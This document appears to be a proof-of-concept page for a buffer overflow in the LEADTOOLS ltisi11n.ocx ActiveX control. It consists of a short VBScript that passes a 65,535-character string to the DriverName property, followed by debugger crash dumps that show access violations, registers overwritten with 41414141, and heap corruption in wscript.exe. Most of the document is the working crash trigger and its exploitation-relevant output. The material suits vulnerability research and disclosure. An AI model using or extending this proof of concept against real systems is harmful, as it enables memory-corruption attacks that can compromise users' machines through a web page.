@@ -1,0 +1,388 @@
+<html>
+Test Exploit Page
+<object classid='clsid:00110050-B1BA-11CE-ABC6-F5B2E79D9E3F' id='target' /></object>
+<script language='vbscript'>
+
+targetFile = "C:\Program Files\Rational\common\ltisi11n.ocx"
+prototype  = "Property Let DriverName As String"
+memberName = "DriverName"
+progid     = "LEADISISLib.LEADISIS"
+argCount   = 1
+
+arg1=String(65535, "A")
+
+target.DriverName = arg1
+
+</script>
+
+
+Exception Code: ACCESS_VIOLATION
+Disasm: 7C80BEB9	MOV [EDX],AL
+
+Seh Chain:
+--------------------------------------------------
+1 	7C839AD8 	KERNEL32.dll
+2 	73352960 	VBSCRIPT.dll
+3 	7C839AD8 	KERNEL32.dll
+
+
+Called From                   Returns To                    
+--------------------------------------------------
+KERNEL32.7C80BEB9             ltisi11n.AA1537               
+ltisi11n.AA1537               OLEAUT32.77135CD9             
+OLEAUT32.77135CD9             OLEAUT32.771362E8             
+OLEAUT32.771362E8             ltisi11n.AA64D7               
+ltisi11n.AA64D7               ltisi11n.AA319B               
+ltisi11n.AA319B               VBSCRIPT.73303EB7             
+VBSCRIPT.73303EB7             VBSCRIPT.73303E27             
+VBSCRIPT.73303E27             VBSCRIPT.73303397             
+VBSCRIPT.73303397             VBSCRIPT.73303D88             
+VBSCRIPT.73303D88             VBSCRIPT.73311302             
+VBSCRIPT.73311302             VBSCRIPT.733063EE             
+VBSCRIPT.733063EE             VBSCRIPT.73306373             
+VBSCRIPT.73306373             VBSCRIPT.73306BA5             
+VBSCRIPT.73306BA5             VBSCRIPT.73306D9D             
+VBSCRIPT.73306D9D             VBSCRIPT.73305103             
+VBSCRIPT.73305103             SCROBJ.5CE44396               
+SCROBJ.5CE44396               SCROBJ.5CE4480B               
+SCROBJ.5CE4480B               SCROBJ.5CE446A6               
+SCROBJ.5CE446A6               SCROBJ.5CE44643               
+SCROBJ.5CE44643               SCROBJ.5CE44608               
+SCROBJ.5CE44608               1013C93                       
+1013C93                       1006B0C                       
+1006B0C                       100332C                       
+100332C                       1003105                       
+1003105                       1003076                       
+1003076                       1002F16                       
+1002F16                       KERNEL32.7C817077             
+
+
+Registers:
+--------------------------------------------------
+EIP 7C80BEB9 -> AD0013ED
+EAX 0013BD41 -> AD0013ED
+EBX 00AAA760 -> 00AA408F
+ECX 0013CDA4 -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+EDX 02A73000
+EDI 0000302A
+ESI 02A71F58 -> 00AAA760
+EBP 0013BD6C -> 0013EDB0
+ESP 0013BD48 -> 0000302A -> Uni: *0*0
+
+
+Block Disassembly: 
+--------------------------------------------------
+7C80BEA3	PUSH 7C80BED0
+7C80BEA8	CALL 7C8024D6
+7C80BEAD	AND DWORD PTR [EBP-4],0
+7C80BEB1	MOV ECX,[EBP+C]
+7C80BEB4	MOV EDX,[EBP+8]
+7C80BEB7	MOV AL,[ECX]
+7C80BEB9	MOV [EDX],AL	  <--- CRASH
+7C80BEBB	INC ECX
+7C80BEBC	INC EDX
+7C80BEBD	TEST AL,AL
+7C80BEBF	JNZ SHORT 7C80BEB7
+7C80BEC1	OR DWORD PTR [EBP-4],FFFFFFFF
+7C80BEC5	MOV EAX,[EBP+8]
+7C80BEC8	CALL 7C802511
+7C80BECD	RETN 8
+
+
+ArgDump:
+--------------------------------------------------
+EBP+8	02A71FD8 -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+EBP+12	0013BD7C -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+EBP+16	41414141
+EBP+20	41414141
+EBP+24	41414141
+EBP+28	41414141
+
+
+Stack Dump:
+--------------------------------------------------
+13BD48 2A 30 00 00 58 1F A7 02 60 A7 AA 00 48 BD 13 00  [....X...`...H...]
+13BD58 7C BD 13 00 AC F1 13 00 D8 9A 83 7C D0 BE 80 7C  [................]
+13BD68 00 00 00 00 B0 ED 13 00 37 15 AA 00 D8 1F A7 02  [................]
+13BD78 7C BD 13 00 41 41 41 41 41 41 41 41 41 41 41 41  [................]
+13BD88 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  [................]
+
+
+
+Exception Code: ACCESS_VIOLATION
+Disasm: 7C919084	MOV ECX,[EBX]
+
+Seh Chain:
+--------------------------------------------------
+1 	7C90E920 	ntdll.dll
+2 	7C90E920 	ntdll.dll
+3 	7C90E920 	ntdll.dll
+4 	7C90E920 	ntdll.dll
+5 	73352960 	VBSCRIPT.dll
+6 	7C839AD8 	KERNEL32.dll
+
+
+Called From                   Returns To                    
+--------------------------------------------------
+ntdll.7C919084                ntdll.7C96EEA0                
+ntdll.7C96EEA0                ntdll.7C94B394                
+ntdll.7C94B394                ntdll.7C918F21                
+ntdll.7C918F21                ltisi11n.AA69BC               
+ltisi11n.AA69BC               ltisi11n.AA7189               
+ltisi11n.AA7189               ltisi11n.AA154C               
+ltisi11n.AA154C               OLEAUT32.77135CD9             
+OLEAUT32.77135CD9             OLEAUT32.771362E8             
+OLEAUT32.771362E8             ltisi11n.AA64D7               
+ltisi11n.AA64D7               ltisi11n.AA319B               
+ltisi11n.AA319B               VBSCRIPT.73303EB7             
+VBSCRIPT.73303EB7             VBSCRIPT.73303E27             
+VBSCRIPT.73303E27             VBSCRIPT.73303397             
+VBSCRIPT.73303397             VBSCRIPT.73303D88             
+VBSCRIPT.73303D88             VBSCRIPT.73311302             
+VBSCRIPT.73311302             VBSCRIPT.733063EE             
+VBSCRIPT.733063EE             VBSCRIPT.73306373             
+VBSCRIPT.73306373             VBSCRIPT.73306BA5             
+VBSCRIPT.73306BA5             VBSCRIPT.73306D9D             
+VBSCRIPT.73306D9D             VBSCRIPT.73305103             
+VBSCRIPT.73305103             SCROBJ.5CE44396               
+SCROBJ.5CE44396               SCROBJ.5CE4480B               
+SCROBJ.5CE4480B               SCROBJ.5CE446A6               
+SCROBJ.5CE446A6               SCROBJ.5CE44643               
+SCROBJ.5CE44643               SCROBJ.5CE44608               
+SCROBJ.5CE44608               1013C93                       
+1013C93                       1006B0C                       
+1006B0C                       100332C                       
+100332C                       1003105                       
+1003105                       1003076                       
+1003076                       1002F16                       
+1002F16                       KERNEL32.7C817077             
+
+
+Registers:
+--------------------------------------------------
+EIP 7C919084 -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+EAX 02A72100 -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+EBX 41414141
+ECX 00004141
+EDX 02A70168 -> 00000000
+EDI 41414141
+ESI 02A720F8 -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+EBP 0013B824 -> 0013B8A8
+ESP 0013B608 -> 0000001C
+
+
+Block Disassembly: 
+--------------------------------------------------
+7C91906D	MOV [EBP-25],AL
+7C919070	LEA EAX,[ESI+8]
+7C919073	MOV EDI,[EAX]
+7C919075	MOV [EBP-1E4],EDI
+7C91907B	MOV EBX,[ESI+C]
+7C91907E	MOV [EBP-164],EBX
+7C919084	MOV ECX,[EBX]	  <--- CRASH
+7C919086	CMP ECX,[EDI+4]
+7C919089	JNZ 7C92CC59
+7C91908F	CMP ECX,EAX
+7C919091	JNZ 7C92CC59
+7C919097	PUSH ESI
+7C919098	PUSH DWORD PTR [EBP-1C]
+7C91909B	CALL 7C910684
+7C9190A0	MOV [EBX],EDI
+
+
+ArgDump:
+--------------------------------------------------
+EBP+8	02A70000 -> 000000C8
+EBP+12	50000161
+EBP+16	0000001C
+EBP+20	02A70000 -> 000000C8
+EBP+24	00000000
+EBP+28	02A70000 -> 000000C8
+
+
+Stack Dump:
+--------------------------------------------------
+13B608 1C 00 00 00 00 00 A7 02 01 00 00 00 00 00 00 00  [................]
+13B618 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  [................]
+13B628 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  [................]
+13B638 00 00 00 00 00 00 00 00 41 41 41 41 00 00 00 00  [................]
+13B648 00 00 00 00 00 00 00 00 00 60 13 00 00 00 14 00  [.........`......]
+
+
+
+Exception Code: BREAKPOINT
+Disasm: 7C90120E	INT3
+
+Seh Chain:
+--------------------------------------------------
+1 	7C90E920 	ntdll.dll
+2 	7C90E920 	ntdll.dll
+3 	7C90E920 	ntdll.dll
+4 	7C839AD8 	KERNEL32.dll
+
+
+Called From                   Returns To                    
+--------------------------------------------------
+ntdll.7C90120F                ntdll.7C95F38C                
+ntdll.7C95F38C                ntdll.7C96E507                
+ntdll.7C96E507                ntdll.7C96F75E                
+ntdll.7C96F75E                ntdll.7C94BC4C                
+ntdll.7C94BC4C                ntdll.7C927573                
+ntdll.7C927573                ltisi11n.AA69F4               
+ltisi11n.AA69F4               VBSCRIPT.733015F2             
+VBSCRIPT.733015F2             VBSCRIPT.7331EEE1             
+VBSCRIPT.7331EEE1             VBSCRIPT.7331F192             
+VBSCRIPT.7331F192             VBSCRIPT.7331F632             
+VBSCRIPT.7331F632             VBSCRIPT.73321CB3             
+VBSCRIPT.73321CB3             SCROBJ.5CE448DD               
+SCROBJ.5CE448DD               SCROBJ.5CE49EEA               
+SCROBJ.5CE49EEA               SCROBJ.5CE49E41               
+SCROBJ.5CE49E41               1013CE7                       
+1013CE7                       1006B0C                       
+1006B0C                       100332C                       
+100332C                       1003105                       
+1003105                       1003076                       
+1003076                       1002F16                       
+1002F16                       KERNEL32.7C817077             
+
+
+Registers:
+--------------------------------------------------
+EIP 7C90120F -> 000B0041
+EAX 02A71EF0 -> 000B0041
+EBX 02A720E4 -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ECX 7C91EAD5 -> FF0014C2
+EDX 0013EECE -> EEF4000A
+EDI 000001EC
+ESI 02A71EF0 -> 000B0041
+EBP 0013F0D4 -> 0013F0EC
+ESP 0013F0D0 -> 7C96E139
+
+
+Block Disassembly: 
+--------------------------------------------------
+7C9011FF	TEST BYTE PTR [ESI+10],10
+7C901203	JE 7C90FEF6
+7C901209	POP ESI
+7C90120A	LEAVE
+7C90120B	RETN 4
+7C90120E	INT3
+7C90120F	RETN	  <--- CRASH
+7C901210	MOV EDI,EDI
+7C901212	INT3
+7C901213	RETN
+7C901214	MOV EDI,EDI
+7C901216	MOV EAX,[ESP+4]
+7C90121A	INT3
+7C90121B	RETN 4
+7C90121E	MOV EAX,FS:[18]
+
+
+ArgDump:
+--------------------------------------------------
+EBP+8	02A71EF0 -> 000B0041
+EBP+12	02A71EF0 -> 000B0041
+EBP+16	02A70000 -> 000000C8
+EBP+20	02A71EF0 -> 000B0041
+EBP+24	0013F100 -> 0013F174
+EBP+28	7C96E507 -> 3374C084
+
+
+Stack Dump:
+--------------------------------------------------
+13F0D0 39 E1 96 7C EC F0 13 00 8C F3 95 7C F0 1E A7 02  [................]
+13F0E0 F0 1E A7 02 00 00 A7 02 F0 1E A7 02 00 F1 13 00  [................]
+13F0F0 07 E5 96 7C 00 00 00 00 00 00 A7 02 F8 1E A7 02  [................]
+13F100 74 F1 13 00 5E F7 96 7C 00 00 A7 02 F0 1E A7 02  [t...^...........]
+13F110 14 F9 96 7C 00 00 A7 02 F8 1E A7 02 60 00 00 40  [............`...]
+
+
+
+Exception Code: ACCESS_VIOLATION
+Disasm: 7C96E478	CMP BYTE PTR [EBX+7],FF
+
+Seh Chain:
+--------------------------------------------------
+1 	7C90E920 	ntdll.dll
+2 	7C90E920 	ntdll.dll
+3 	7C839AD8 	KERNEL32.dll
+4 	7C90E920 	ntdll.dll
+5 	7C839AD8 	KERNEL32.dll
+6 	7C839AD8 	KERNEL32.dll
+
+
+Called From                   Returns To                    
+--------------------------------------------------
+ntdll.7C96E478                ntdll.7C96FA1D                
+ntdll.7C96FA1D                ntdll.7C94D281                
+ntdll.7C94D281                KERNEL32.7C834D23             
+KERNEL32.7C834D23             LTKRN11n.2001087F             
+LTKRN11n.2001087F             ntdll.7C913A43                
+ntdll.7C913A43                KERNEL32.7C80C136             
+KERNEL32.7C80C136             KERNEL32.7C80B72F             
+
+
+Registers:
+--------------------------------------------------
+EIP 7C96E478
+EAX FFFFFFF8
+EBX FFFFFFF8
+ECX 00150000 -> 000000C8
+EDX 00150608 -> 7C97E5A0
+EDI 00000000
+ESI 00150000 -> 000000C8
+EBP 00FFFD9C -> 00FFFDEC
+ESP 00FFFD94 -> 00150000
+
+
+Block Disassembly: 
+--------------------------------------------------
+7C96E468	PUSH EBX
+7C96E469	MOV EBX,[EBP+C]
+7C96E46C	TEST EBX,EBX
+7C96E46E	PUSH ESI
+7C96E46F	MOV ESI,[EBP+8]
+7C96E472	JE 7C96E53E
+7C96E478	CMP BYTE PTR [EBX+7],FF	  <--- CRASH
+7C96E47C	JNZ SHORT 7C96E4BC
+7C96E47E	CMP BYTE PTR [ESI+586],2
+7C96E485	JNZ SHORT 7C96E48F
+7C96E487	MOV EAX,[ESI+580]
+7C96E48D	JMP SHORT 7C96E491
+7C96E48F	XOR EAX,EAX
+7C96E491	TEST EAX,EAX
+7C96E493	JE 7C96E53E
+
+
+ArgDump:
+--------------------------------------------------
+EBP+8	00150000 -> 000000C8
+EBP+12	FFFFFFF8
+EBP+16	7C96FADC -> Asc: RtlGetUserInfoHeap
+EBP+20	00000000
+EBP+24	00000000
+EBP+28	00000003
+
+
+Stack Dump:
+--------------------------------------------------
+FFFD94 00 00 15 00 01 00 00 00 EC FD FF 00 1D FA 96 7C  [................]
+FFFDA4 00 00 15 00 F8 FF FF FF DC FA 96 7C 00 00 00 00  [................]
+FFFDB4 00 00 00 00 03 00 00 00 6C FE FF 00 8F 04 44 7E  [........l.....D.]
+FFFDC4 F8 FF FF FF 00 00 15 00 5B 21 00 01 02 04 00 00  [........[.......]
+FFFDD4 B0 FD FF 00 00 00 00 00 40 FE FF 00 20 E9 90 7C  [................]
+
+
+
+ApiLog
+--------------------------------------------------
+
+***** Installing Hooks *****
+7c821a94     CreateFileA(C:\WINDOWS\system32\rsaenh.dll)
+7c821a94     CreateFileA(C:\WINDOWS\system32\rsaenh.dll)
+Debug String Log
+--------------------------------------------------
+
+HEAP[wscript.exe]: 
+Heap block at 02A71EF0 modified at 02A720E4 past requested size of 1ec
+
